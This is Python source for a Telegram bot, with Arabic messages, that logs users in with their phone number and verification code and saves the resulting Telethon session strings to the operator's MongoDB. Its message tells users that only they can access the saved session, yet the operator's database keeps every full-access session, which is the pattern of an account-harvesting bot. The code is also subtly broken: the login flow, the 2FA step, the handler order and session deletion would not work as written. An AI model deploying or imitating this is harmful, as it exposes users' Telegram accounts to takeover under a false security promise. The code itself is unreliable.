import os
import asyncio
import logging
from telethon import TelegramClient, sessions
from telethon.errors import SessionPasswordNeededError
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import pymongo
from datetime import datetime

# ==================== المتغيرات البيئية ====================
TOKEN = os.environ.get("TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH")
MONGO_URL = os.environ.get("MONGO_URL")  # رابط MongoDB

# ==================== اتصال MongoDB ====================
client_mongo = pymongo.MongoClient(MONGO_URL)
db = client_mongo["telegram_sessions"]
collection = db["sessions"]

# ==================== إعداد البوت ====================
bot = telebot.TeleBot(TOKEN)
logging.basicConfig(level=logging.INFO)

# تخزين مؤقت للبيانات (لكل مستخدم)
user_data = {}

# ==================== الأوامر ====================
@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
    markup.add(InlineKeyboardButton("📋 جلساتي المحفوظة", callback_data="my_sessions"))
    bot.send_message(message.chat.id, 
                     "⚠️ **تحذير:** ملف الجلسة يمنح وصول كامل لحسابك.\n"
                     "لا ترسله لأي شخص.\n\n"
                     "📌 الأوامر المتاحة:\n"
                     "/start - القائمة الرئيسية\n"
                     "/gensession - إنشاء جلسة جديدة\n"
                     "/mysessions - عرض جلساتي المحفوظة\n"
                     "/revoke - حذف جلسة معينة",
                     reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['gensession'])
def gen_session(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
    bot.send_message(message.chat.id, 
                     "⚠️ **تنبيه أمان:**\n"
                     "سيتم إنشاء جلسة جديدة وحفظها في قاعدة البيانات.\n"
                     "أنت وحدك من يستطيع الوصول إليها.\n\n"
                     "هل توافق؟",
                     reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "agree")
def agree(call):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(call.message.chat.id, 
                          "📱 أرسل رقم هاتفك مع المفتاح الدولي\n"
                          "مثال: `+966501234567`\n\n"
                          "أو اضغط /cancel للإلغاء", 
                          parse_mode='Markdown')
    bot.register_next_step_handler(msg, get_phone)

def get_phone(message):
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ تم الإلغاء.")
        return
    
    phone = message.text.strip()
    chat_id = message.chat.id
    user_data[chat_id] = {'phone': phone, 'step': 'phone'}
    
    bot.send_message(chat_id, "⏳ جاري إرسال رمز التحقق...")
    # تشغيل Telethon
    asyncio.run(send_code(chat_id, phone))

async def send_code(chat_id, phone):
    try:
        # إنشاء عميل Telethon (بدون حفظ ملف)
        client = TelegramClient(sessions.StringSession(), API_ID, API_HASH)
        await client.start(phone=phone)
        user_data[chat_id]['client'] = client
        bot.send_message(chat_id, "🔑 أرسل رمز التحقق (5 أرقام) الذي وصل إليك في Telegram:")
    except Exception as e:
        bot.send_message(chat_id, f"❌ فشل الإرسال: {str(e)}")

@bot.message_handler(func=lambda m: True)
def handle_code(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'client' not in user_data[chat_id]:
        bot.send_message(chat_id, "❌ ابدأ من جديد بـ /gensession")
        return
    
    code = message.text.strip()
    asyncio.run(complete_auth(chat_id, code))

async def complete_auth(chat_id, code):
    client = user_data[chat_id]['client']
    phone = user_data[chat_id]['phone']
    
    try:
        await client.sign_in(code=code)
        # استخراج الجلسة كنص (String Session)
        session_string = client.session.save()
        await client.disconnect()
        
        # حفظ في MongoDB
        session_data = {
            "user_id": chat_id,
            "phone": phone,
            "session_string": session_string,
            "created_at": datetime.utcnow(),
            "is_active": True
        }
        collection.insert_one(session_data)
        
        # إرسال الجلسة للمستخدم
        bot.send_message(chat_id, 
                        f"✅ **تم حفظ جلسة جديدة!**\n\n"
                        f"📱 الرقم: `{phone}`\n"
                        f"🆔 المعرف: {session_data['_id']}\n\n"
                        f"🔑 **جلسة النص (String Session):**\n"
                        f"`{session_string}`\n\n"
                        f"⚠️ احتفظ بها بأمان! يمكنك استرجاعها بـ /mysessions",
                        parse_mode='Markdown')
        
        # تنظيف
        del user_data[chat_id]
        
    except SessionPasswordNeededError:
        bot.send_message(chat_id, "🔐 حسابك مفعل بـ 2FA. أرسل كلمة المرور:")
        user_data[chat_id]['step'] = '2fa'
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
        await client.disconnect()

# ==================== عرض الجلسات المحفوظة ====================
@bot.message_handler(commands=['mysessions'])
def my_sessions(message):
    chat_id = message.chat.id
    sessions = list(collection.find({"user_id": chat_id, "is_active": True}))
    
    if not sessions:
        bot.send_message(chat_id, "📭 لا توجد جلسات محفوظة.")
        return
    
    text = "📋 **جلساتك المحفوظة:**\n\n"
    for i, sess in enumerate(sessions, 1):
        text += f"{i}. 📱 {sess['phone']}\n"
        text += f"   🆔 `{sess['_id']}`\n"
        text += f"   📅 {sess['created_at'].strftime('%Y-%m-%d %H:%M')}\n\n"
    
    text += "\nلحذف جلسة: /revoke [المعرف]"
    bot.send_message(chat_id, text, parse_mode='Markdown')

# ==================== حذف جلسة ====================
@bot.message_handler(commands=['revoke'])
def revoke_session(message):
    chat_id = message.chat.id
    parts = message.text.split()
    
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ أرسل المعرف المراد حذفه:\n`/revoke 65f3a1b2...`", parse_mode='Markdown')
        return
    
    session_id = parts[1]
    result = collection.delete_one({"_id": session_id, "user_id": chat_id})
    
    if result.deleted_count > 0:
        bot.send_message(chat_id, "✅ تم حذف الجلسة بنجاح.")
    else:
        bot.send_message(chat_id, "❌ لم أجد جلسة بهذا المعرف.")

# ==================== تشغيل البوت ====================
if __name__ == "__main__":
    bot.polling()
